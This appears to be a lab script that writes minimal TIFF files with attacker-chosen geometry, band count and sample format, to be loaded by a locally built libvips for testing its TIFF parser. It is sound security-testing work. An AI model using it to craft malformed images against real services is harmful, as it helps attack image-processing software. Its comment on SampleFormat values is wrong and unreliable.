#!/usr/bin/env python3
"""Emit minimal little-endian TIFF headers with attacker-chosen geometry.

Used only inside the lab: files are loaded by the locally built, pinned
libvips 8.18.2 through VipsForeignLoadTiff. No external target is contacted.
"""
import struct
import sys

def make_tiff(path, width, height, bands, data=b"\x5a" * 8, bits=8,
              sample_format=None):
    entries = [
        (256, 4, 1, width),        # ImageWidth
        (257, 4, 1, height),       # ImageLength
        (258, 3, 1, bits),         # BitsPerSample
        (259, 3, 1, 1),            # Compression = none
        (262, 3, 1, 1),            # Photometric = BlackIsZero
        (273, 4, 1, 0),            # StripOffsets (patched below)
        (277, 3, 1, bands),        # SamplesPerPixel
        (278, 4, 1, height),       # RowsPerStrip
        (279, 4, 1, len(data)),    # StripByteCounts
        (284, 3, 1, 1),            # PlanarConfiguration = contiguous
    ]
    if sample_format is not None:
        entries.append((339, 3, 1, sample_format))  # SampleFormat: 1=int 3=uint
        entries.sort(key=lambda e: e[0])
    ifd_off = 8
    data_off = ifd_off + 2 + 12 * len(entries) + 4
    out = bytearray()
    out += b"II" + struct.pack("<HI", 42, ifd_off)
    out += struct.pack("<H", len(entries))
    for tag, typ, count, value in entries:
        if tag == 273:
            value = data_off
        if typ == 3:
            raw = struct.pack("<HH", value, 0)
        else:
            raw = struct.pack("<I", value)
        out += struct.pack("<HHI", tag, typ, count) + raw
    out += struct.pack("<I", 0)  # no next IFD
    assert len(out) == data_off, (len(out), data_off)
    out += data
    with open(path, "wb") as f:
        f.write(out)
    print(f"{path}: width={width} height={height} bands={bands} bytes={len(out)}")


if __name__ == "__main__":
    make_tiff(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]), int(sys.argv[4]),
              bits=int(sys.argv[5]) if len(sys.argv) > 5 else 8,
              sample_format=int(sys.argv[6]) if len(sys.argv) > 6 else None)
